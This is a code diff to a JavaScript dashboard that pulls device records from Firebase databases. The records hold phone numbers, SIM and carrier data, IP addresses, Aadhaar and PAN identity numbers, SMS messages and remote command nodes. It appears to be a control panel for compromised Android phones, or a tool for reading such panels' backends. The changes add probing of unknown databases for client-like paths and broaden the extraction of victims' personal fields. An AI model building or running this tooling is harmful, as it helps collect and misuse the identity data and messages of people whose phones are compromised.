@@ -21,6 +21,17 @@ import {
   loadBadNumbers,
   parsePanelLink,
 } from "./schemes.js";
+import { databaseReadUrl, shallowReadUrl } from "./lib/firebase-rest.js";
+import {
+  carrierNamesForClient,
+  firstSimMobile,
+  hasClientRecords,
+  mergeClientProfile,
+  normalizeClientSims,
+  phoneNumbersForClient,
+  providerForClient,
+  simCountForClient,
+} from "./lib/client-data.js";
 // Reuse the existing Firebase write paths without adding UI controls or changing their payloads.
 const writeData = (databaseRef, value) => set(databaseRef, value);
 let currentActiveTab = "clients",
@@ -451,54 +462,14 @@ function isValidDeviceId(id) {
   );
 }
 function getPhoneNumbers(client) {
-  const numbers = [];
-  return (
-    client.mobNo &&
-      client.mobNo.trim() &&
-      client.mobNo.trim() !== "Unknown" &&
-      numbers.push(client.mobNo.trim()),
-    client.sims &&
-      Array.isArray(client.sims) &&
-      client.sims.forEach((sim) => {
-        if (
-          sim &&
-          sim.phoneNumber &&
-          sim.phoneNumber.trim() &&
-          sim.phoneNumber.trim() !== "Unknown"
-        ) {
-          const num = sim.phoneNumber.trim();
-          numbers.includes(num) || numbers.push(num);
-        }
-      }),
-    numbers.length > 0 ? numbers : null
-  );
+  const numbers = phoneNumbersForClient(client);
+  return numbers.length ? numbers : null;
 }
 function getProviderLabel(client) {
-  if (
-    client.service_provider &&
-    client.service_provider.trim() &&
-    client.service_provider.trim() !== "Unknown"
-  )
-    return client.service_provider.trim();
-  if (client.sims && Array.isArray(client.sims) && client.sims.length > 0) {
-    const providers = client.sims
-      .map((s) => s.carrierName)
-      .filter(Boolean)
-      .filter((v) => v !== "Unknown");
-    if (providers.length > 0) return providers.join(" | ");
-  }
-  return "—";
+  return providerForClient(client);
 }
 function getCarriers(client) {
-  if (!client || !Array.isArray(client.sims)) return [];
-  const out = [];
-  return (
-    client.sims.forEach((s) => {
-      const c = s && s.carrierName ? String(s.carrierName).trim() : "";
-      c && c.toLowerCase() !== "unknown" && !out.includes(c) && out.push(c);
-    }),
-    out
-  );
+  return carrierNamesForClient(client);
 }
 function getSimBadge(client) {
   const n = getSimCount(client),
@@ -512,11 +483,7 @@ function getSimBadge(client) {
         : null;
 }
 function getSimCount(client) {
-  return client.sims && Array.isArray(client.sims)
-    ? client.sims.filter(
-        (s) => s && s.phoneNumber && s.phoneNumber !== "Unknown",
-      ).length
-    : 0;
+  return simCountForClient(client);
 }
 let detectedSchema = 1,
   schemaEvidence = [],
@@ -596,10 +563,6 @@ function isPingOnlyNode(node) {
     const f = Object.keys(v);
     return f.length > 0 && f.every((x) => x === "ping");
   });
-}
-function hasClientRecords(node) {
-  if (!node || typeof node != "object") return !1;
-  return Object.keys(normalizeClients(node, null)).length > 0;
 }
 function detectSchema() {
   const evidence = [];
@@ -728,36 +691,18 @@ function parseDeviceInfoString(s) {
   });
   return out;
 }
-function simsFromInlineFields(raw) {
-  const sims = [];
-  for (let i = 1; i <= 4; i++) {
-    const num = raw["numberSim" + i],
-      name = raw["nameSim" + i],
-      type = raw["typeSim" + i],
-      icc = raw["iccIdSim" + i];
-    if (num == null && name == null) continue;
-    const numStr = num == null ? "" : String(num).trim(),
-      nameStr = name == null ? "" : String(name).trim(),
-      typeStr = type == null ? "" : String(type).trim();
-    const dead = (v) =>
-      !v || /^(no sim found|no data|not available|unknown|none|-)$/i.test(v);
-    if (dead(numStr) && dead(nameStr)) continue;
-    const digits = numStr.replace(/\D/g, ""),
-      phone = digits.length >= 10 ? digits.slice(-10) : "";
-    sims.push({
-      phoneNumber: phone || void 0,
-      carrierName: dead(nameStr) ? void 0 : nameStr,
-      slot: i,
-      simType: dead(typeStr) ? void 0 : typeStr,
-      iccid: icc && !dead(String(icc)) ? String(icc).trim() : void 0,
-    });
-  }
-  return sims;
-}
 function normalizeClient(raw, sim) {
   if (!raw || typeof raw != "object") return null;
+  raw = mergeClientProfile(raw);
   const c = { ...raw };
-  const dinfo = parseDeviceInfoString(raw.Device_info || raw.device_info);
+  const rawDeviceInfo = firstOf(raw, ["Device_info", "device_info", "DeviceInfo", "deviceInfo"]),
+    dinfo =
+      typeof rawDeviceInfo === "string"
+        ? parseDeviceInfoString(rawDeviceInfo)
+        : rawDeviceInfo && typeof rawDeviceInfo === "object"
+          ? rawDeviceInfo
+          : {},
+    osVersion = firstOf(dinfo, ["os", "osVersion", "androidVersion"]);
   if (
     (c.modelName ||
       (c.modelName =
@@ -766,13 +711,21 @@ function normalizeClient(raw, sim) {
           "name",
           "device_name",
           "deviceName",
+          "device_name_model",
           "model",
           "Model",
+          "model_name",
+          "modelName",
           "device_model",
+          "deviceModel",
+          "phoneModel",
+          "brand",
+          "manufacturer",
+          "product",
           "label",
           "d_name",
         ]) ||
-        dinfo.model ||
+        firstOf(dinfo, ["model", "Model", "modelName", "deviceName", "name"]) ||
         "Unknown Device"),
     c.battery === void 0 || c.battery === null || c.battery === "")
   ) {
@@ -806,84 +759,8 @@ function normalizeClient(raw, sim) {
     ]);
     s !== void 0 && (c.status = toBoolStatus(s));
   }
-  if (!Array.isArray(c.sims) && sim && typeof sim == "object") {
-    const sims = [];
-    (["sim1", "sim2", "sim3", "sim4", "Sim1", "Sim2", "Sim3", "Sim4"].forEach(
-      (sk) => {
-        const v = sim[sk];
-        if (!v) return;
-        const s = String(v),
-          m = s.match(/(\+?\d{10,13})\b/);
-        if (!m) return;
-        const d10 = m[1].replace(/\D/g, "").slice(-10);
-        d10.length !== 10 ||
-          !"6789".includes(d10[0]) ||
-          (sims.some((x) => x.phoneNumber === d10) ||
-            sims.push({
-              phoneNumber: d10,
-              carrierName:
-                (s.split(/\s*[\u2014\u2013-]\s*/).pop() || "").trim() || void 0,
-              slot: parseInt(String(sk).replace(/\D/g, ""), 10) || void 0,
-            }),
-          String(v).trim().toLowerCase() === "yes" && (c.dualSim = !0));
-      },
-    ),
-      String(sim.dualSim || sim.dualsim || "")
-        .trim()
-        .toLowerCase() === "yes" && (c.dualSim = !0),
-      sims.length && (c.sims = sims));
-  }
-  if (!Array.isArray(c.sims)) {
-    const inline = simsFromInlineFields(raw);
-    inline.length && (c.sims = inline);
-  }
-  if (!Array.isArray(c.sims)) {
-    const sims = [];
-    for (let i = 1; i <= 4; i++) {
-      const s = raw["Sim" + i];
-      if (s != null) {
-        if (typeof s == "string")
-          s.trim() &&
-            s.trim() !== "Unknown" &&
-            sims.push({ phoneNumber: s.trim() });
-        else if (typeof s == "object") {
-          const num = firstOf(s, [
-            "phoneNumber",
-            "number",
-            "phone",
-            "msisdn",
-            "mobNo",
-          ]);
-          num &&
-            String(num).trim() &&
-            String(num).trim() !== "Unknown" &&
-            sims.push({
-              phoneNumber: String(num).trim(),
-              carrierName:
-                firstOf(s, ["carrierName", "carrier", "operator", "network"]) ||
-                void 0,
-            });
-        }
-      }
-    }
-    (Object.keys(raw).forEach((k) => {
-      if (!/^sim[_-]?\d+$/i.test(k)) return;
-      const s = raw[k];
-      if (typeof s == "string" && s.trim() && s.trim() !== "Unknown")
-        sims.some((x) => x.phoneNumber === s.trim()) ||
-          sims.push({ phoneNumber: s.trim() });
-      else if (s && typeof s == "object") {
-        const num = firstOf(s, ["phoneNumber", "number", "phone", "msisdn"]);
-        num &&
-          !sims.some((x) => x.phoneNumber === String(num).trim()) &&
-          sims.push({
-            phoneNumber: String(num).trim(),
-            carrierName: firstOf(s, ["carrierName", "carrier", "operator"]),
-          });
-      }
-    }),
-      sims.length && (c.sims = sims));
-  }
+  const normalizedSims = normalizeClientSims(raw, sim);
+  c.sims = normalizedSims;
   if (!c.mobNo) {
     const m = firstOf(raw, [
       "phoneNumber",
@@ -892,21 +769,35 @@ function normalizeClient(raw, sim) {
       "msisdn",
       "mobile",
       "mob_no",
+      "phone_number",
+      "contactNumber",
       "Number",
       "Mobile",
     ]);
-    m && (c.mobNo = String(m).trim());
+    (typeof m === "string" || typeof m === "number") &&
+      String(m).trim() &&
+      (c.mobNo = String(m).trim());
   }
+  const primaryMobile =
+    typeof c.mobNo === "string" || typeof c.mobNo === "number"
+      ? String(c.mobNo).trim()
+      : "";
+  if (primaryMobile.replace(/\D/g, "").length >= 10) {
+    const primarySim = c.sims.find((entry) => !entry.phoneNumber);
+    if (primarySim) primarySim.phoneNumber = primaryMobile;
+    else if (!c.sims.length) c.sims = [{ phoneNumber: primaryMobile, slot: 1 }];
+  }
+  const explicitDualSim =
+    firstOf(raw, ["dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM"]) ??
+    firstOf(sim && typeof sim === "object" ? sim : {}, [
+      "dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM",
+    ]);
+  if (c.dualSim === void 0 && explicitDualSim !== void 0) {
+    c.dualSim = toBoolStatus(explicitDualSim);
+  }
+  if (c.dualSim === void 0 && c.sims.length > 1) c.dualSim = !0;
   if (
-    (c.dualSim === void 0 &&
-      (c.dualSim = toBoolStatus(
-        firstOf(raw, ["dualSim", "dualsim", "isDualSim", "DualSim"]),
-      )),
-    c.dualSim === void 0 &&
-      Array.isArray(c.sims) &&
-      c.sims.length > 1 &&
-      (c.dualSim = !0),
-    c.person || (c.person = firstOf(raw, ["Name", "name"])),
+    (c.person || (c.person = firstOf(raw, ["Name", "name"])),
     c.aadhaar || (c.aadhaar = firstOf(raw, ["Aadhaar", "aadhaar", "aadhar"])),
     c.panCard ||
       (c.panCard = firstOf(raw, ["PanCard", "pancard", "pan", "PAN"])),
@@ -918,21 +809,29 @@ function normalizeClient(raw, sim) {
       "operator",
       "network",
       "provider",
+      "serviceProvider",
       "simOperator",
+      "networkOperator",
     ]);
     p && (c.service_provider = String(p).trim());
   }
   if (
     (c.ip_address ||
-      (c.ip_address = firstOf(raw, ["ip", "ipAddress", "last_ip"])),
+      (c.ip_address = firstOf(raw, [
+        "ip", "IP", "ipAddress", "ip_address", "IP_Address", "last_ip", "lastIp",
+      ]) || firstOf(dinfo, ["ip", "ipAddress", "ip_address", "IP_Address"])),
     c.androidV ||
       (c.androidV = firstOf(raw, [
         "androidVersion",
         "android_version",
+        "osVersion",
+        "os_version",
         "sdk",
         "sdkV",
       ]) ||
-        (dinfo.os ? dinfo.os.replace(/^Android\s*/i, "") : void 0)),
+        (osVersion == null
+          ? void 0
+          : String(osVersion).replace(/^Android\s*/i, ""))),
     c.cpu_arch || (c.cpu_arch = firstOf(raw, ["cpuArch", "arch", "abi"])),
     c.storage ||
       (c.storage = firstOf(raw, ["totalStorage", "storageTotal", "disk"])),
@@ -964,20 +863,37 @@ function normalizeClients(node, simsNode) {
       if (!isValidDeviceId(k)) return;
       const rawNode = node[k];
       if (!rawNode || typeof rawNode != "object") return;
-      const did = rawNode.did || rawNode.Did || rawNode.device || k,
+      const profileNode = mergeClientProfile(rawNode),
+        deviceField = profileNode.device,
+        did =
+          profileNode.did ||
+          profileNode.Did ||
+          (typeof deviceField === "string" || typeof deviceField === "number"
+            ? deviceField
+            : firstOf(profileNode, ["deviceId", "device_id", "id"])) ||
+          k,
         sim =
           (simsNode &&
             typeof simsNode == "object" &&
             (simsNode[did] || simsNode[k])) ||
           null,
-        n = normalizeClient(rawNode, sim);
+        n = (() => {
+          try {
+            return normalizeClient(profileNode, sim);
+          } catch (error) {
+            console.warn(`[clients] profile ${k} normalization failed:`, error);
+            return { ...profileNode, modelName: "Unknown Device" };
+          }
+        })();
       n &&
-        ((n.clientId = k),
+        ((n.modelName =
+          typeof n.modelName === "string" || typeof n.modelName === "number"
+            ? String(n.modelName)
+            : "Unknown Device"),
+        (n.clientId = k),
         (n.deviceId = String(did)),
-        !n.mobNo &&
-          n.sims &&
-          n.sims.length &&
-          (n.mobNo = n.sims[0].phoneNumber),
+        n.mobNo != null && typeof n.mobNo !== "object" && (n.mobNo = String(n.mobNo)),
+        !n.mobNo && (n.mobNo = firstSimMobile(n.sims)),
         (out[String(did)] = n));
     }),
     out
@@ -1189,6 +1105,13 @@ const LOAD_STEPS = [
       "user_list",
       "users",
       "Users",
+      "profiles",
+      "Profiles",
+      "device_profiles",
+      "deviceProfiles",
+      "DeviceInfo",
+      "device_info",
+      "deviceInfo",
       "clients",
       "Clients",
       "devices",
@@ -1220,6 +1143,40 @@ function nodeCandidates(key) {
     list.includes(key) || list.push(key),
     list
   );
+}
+let preloadedClientNode = null;
+async function discoverClientCandidates() {
+  const candidates = nodeCandidates("clients"),
+    add = (path) => {
+      path && !candidates.includes(path) && candidates.push(path);
+    };
+  if (!schemaIsManual()) {
+    if (!candidates.includes("clients")) candidates.unshift("clients");
+    try {
+      const clientsValue = await readDatabaseNode(basePath("clients"));
+      if (
+        clientsValue !== null &&
+        !isPingOnlyNode(clientsValue) &&
+        hasClientRecords(clientsValue)
+      ) {
+        preloadedClientNode = clientsValue;
+        return ["clients"];
+      }
+    } catch (e) {}
+  }
+  const rootKeys = await readShallowKeys(basePath(""));
+  if (!rootKeys) return candidates;
+  for (const rootKey of rootKeys) {
+    if (/(client|device|user|profile|inventory|record|account)/i.test(rootKey))
+      add(rootKey);
+    if (!/^all.?users?$/i.test(rootKey)) continue;
+    const children = await readShallowKeys(basePath(rootKey));
+    (children || []).forEach((child) => {
+      /^(info|device.?info|data|user|clients?|devices?|profiles?)$/i.test(child) &&
+        add(rootKey + "/" + child);
+    });
+  }
+  return candidates;
 }
 const COMMAND_CANDIDATES_BY_SCHEMA = {
   6: ["All_User/Commands", "All_Users/Commands"],
@@ -1350,7 +1307,7 @@ let autoRefreshEnabled = !0,
   autoRefreshTimer = null,
   lastMessagesSync = 0,
   messagesSyncBusy = !1;
-const AUTO_REFRESH_MS = 15e3;
+const AUTO_REFRESH_MS = 10e3;
 function loadAutoRefreshPref() {
   try {
     const v = localStorage.getItem("fbAutoRefresh");
@@ -1523,12 +1480,41 @@ const APPLIERS = {
   MSG_LIVE_MAX_DEVICES = 25;
 let messagesTruncated = !1,
   messagesDeviceTotal = 0;
+async function readDatabaseNode(path) {
+  const controller = new AbortController(),
+    timer = setTimeout(() => controller.abort(), 20000);
+  try {
+    const response = await fetch(databaseReadUrl(activeDatabaseUrl, path), {
+      cache: "no-store",
+      signal: controller.signal,
+    });
+    if (!response.ok) {
+      const detail = response.status === 401 || response.status === 403
+        ? "Permission denied — check this database's read rules or auth token."
+        : `HTTP ${response.status}`;
+      throw new Error(`Firebase read ${path}: ${detail}`);
+    }
+    return await response.json();
+  } finally {
+    clearTimeout(timer);
+  }
+}
 async function readShallowKeys(path) {
   try {
-    const snap = await get(ref(db, path));
-    if (!snap.exists()) return null;
-    const v = snap.val();
-    return v && typeof v == "object" ? Object.keys(v) : null;
+    const url = shallowReadUrl(activeDatabaseUrl, path);
+    const controller = new AbortController(),
+      timer = setTimeout(() => controller.abort(), 8000);
+    try {
+      const response = await fetch(url, {
+        cache: "no-store",
+        signal: controller.signal,
+      });
+      if (!response.ok) return null;
+      const value = await response.json();
+      return value && typeof value === "object" ? Object.keys(value) : null;
+    } finally {
+      clearTimeout(timer);
+    }
   } catch (e) {
     return null;
   }
@@ -1550,7 +1536,8 @@ async function loadMessagesBounded(path) {
   const keys = await readShallowKeys(path);
   if (!keys) return null;
   messagesDeviceTotal = keys.length;
-  const take = keys.slice(0, MSG_DEVICE_LIMIT);
+  // Firebase keys are ordered lexicographically; the tail includes newer push-style device IDs.
+  const take = keys.slice(-MSG_DEVICE_LIMIT);
   messagesTruncated = keys.length > take.length;
   const out = {};
   for (let i = 0; i < take.length; i += 3) {
@@ -1610,13 +1597,17 @@ async function loadSequentially() {
     setLoadStatus("Starting sequential load…", "#64748b"));
   let clientsRead = !1,
     clientsReadError = "";
+  preloadedClientNode = null;
   for (const step of LOAD_STEPS) {
     ((loadProgress.current = step.label),
       setLoadStatus(
         `Loading ${step.label} (${loadProgress.done + 1}/${loadProgress.total})…`,
         "#22d3ee",
       ));
-    const candidates = nodeCandidates(step.key);
+    const candidates =
+      step.key === "clients"
+        ? await discoverClientCandidates()
+        : nodeCandidates(step.key);
     let applied = !1;
     for (const cand of candidates)
       try {
@@ -1630,7 +1621,17 @@ async function loadSequentially() {
           }
           continue;
         }
-        const snap = await get(ref(db, basePath(cand)));
+        const nodePath = basePath(cand);
+        let snap;
+        if (step.key === "clients") {
+          const value = cand === "clients" && preloadedClientNode
+            ? preloadedClientNode
+            : await readDatabaseNode(nodePath);
+          preloadedClientNode = null;
+          snap = { exists: () => value !== null, val: () => value };
+        } else {
+          snap = await get(ref(db, nodePath));
+        }
         if (snap.exists()) {
           if (step.key === "clients") {
             if (isPingOnlyNode(snap.val())) {
@@ -1655,13 +1656,13 @@ async function loadSequentially() {
         }
       } catch (e) {
         const message = String(e && (e.message || e.code) || "Firebase read failed");
-        console.warn(`[seq] ${step.label} @ ${cand} failed:`, message);
+        console.warn(`[seq] ${step.label} @ ${cand} failed:`, e);
         if (step.key === "clients") {
           clientsReadError = /permission.denied|unauthorized/i.test(
             `${e && e.code || ""} ${message}`,
           )
-            ? "Permission denied — check this database's read rules or auth token."
-            : message;
+            ? `${cand}: Permission denied — check this database's read rules or auth token.`
+            : `${cand}: ${message}`;
         }
       }
     step.key === "clients" && applied && (clientsRead = !0);
@@ -2237,7 +2238,7 @@ function generateClientsView(clientsNode) {
       )
         return;
       const battery = (item.battery || "0").toString().replace("%", ""),
-        model = item.modelName || "Unknown Device",
+        model = String(item.modelName || "Unknown Device"),
         storage = item.storage || "—",
         androidVer = item.androidV ? "API " + item.androidV : "Base",
         ipAddr = item.ip_address || "—",
@@ -2246,10 +2247,20 @@ function generateClientsView(clientsNode) {
         phoneNumbers = getPhoneNumbers(item),
         phoneDisplay = phoneNumbers
           ? phoneNumbers
-              .map(
-                (n, i) =>
-                  `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${i + 1}: ${n}</span>`,
-              )
+              .map((n, i) => {
+                const digits = String(n).replace(/\D/g, "").slice(-10),
+                  matchingSim = Array.isArray(item.sims)
+                    ? item.sims.find(
+                        (sim) =>
+                          sim &&
+                          String(sim.phoneNumber || sim.number || sim.phone || "")
+                            .replace(/\D/g, "")
+                            .slice(-10) === digits,
+                      )
+                    : null,
+                  slot = matchingSim && matchingSim.slot ? matchingSim.slot : i + 1;
+                return `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${slot}: ${n}</span>`;
+              })
               .join(" ")
           : '<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📱 —</span>',
         providerDisplay = getProviderLabel(item),
